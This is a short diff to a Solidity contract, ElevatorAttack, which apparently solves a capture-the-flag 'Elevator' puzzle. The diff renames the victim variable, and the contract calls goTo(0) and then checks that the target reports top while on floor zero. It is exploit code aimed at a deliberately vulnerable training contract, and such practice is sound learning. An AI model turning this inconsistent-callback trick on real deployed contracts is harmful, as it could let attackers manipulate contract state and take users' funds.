@@ -5,17 +5,17 @@ pragma solidity ^0.8.0;
 import "./interfaces/IElevator.sol";
 
 contract ElevatorAttack {
-    IElevator private immutable victimElevator;
+    IElevator private immutable target;
     bool private _isLastFloor = true;
 
-    constructor(IElevator victimElevator_) {
-        victimElevator = victimElevator_;
+    constructor(IElevator target_) {
+        target = target_;
     }
 
     function attack() external {
-        victimElevator.goTo(0);
+        target.goTo(0);
 
-        require(victimElevator.top() && 0 == victimElevator.floor(), "Elevator: Attack failed");
+        require(target.top() && 0 == target.floor(), "Elevator: Attack failed");
     }
 
     function isLastFloor(
